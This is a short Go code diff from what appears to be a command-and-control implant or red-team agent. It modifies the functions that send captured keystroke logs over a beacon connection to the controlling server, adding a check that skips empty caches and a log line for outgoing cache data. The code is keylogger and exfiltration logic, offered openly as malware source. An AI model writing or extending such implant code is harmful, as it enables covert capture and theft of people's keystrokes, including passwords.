@@ -201,6 +201,12 @@ func main() {
 }
 
 func handleKeysRequest(beacon io.ReadWriteCloser, agentID string) error {
+
+	if cache == "" {
+		logger.Logf(logger.Info, "No logs to send, skipping keys request")
+		return nil
+	}
+
 	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
 
 	req := &patronobuf.Request{
@@ -237,6 +243,8 @@ func handleCacheSocketRequest(beacon io.ReadWriteCloser, agentID string, mu *syn
 	data := builder.String()
 	builder.Reset()
 	mu.Unlock()
+
+	logger.Logf(logger.Info, "Sending cache data: %v", data)
 
 	req := &patronobuf.Request{
 		Type: patronobuf.RequestType_KEYS,
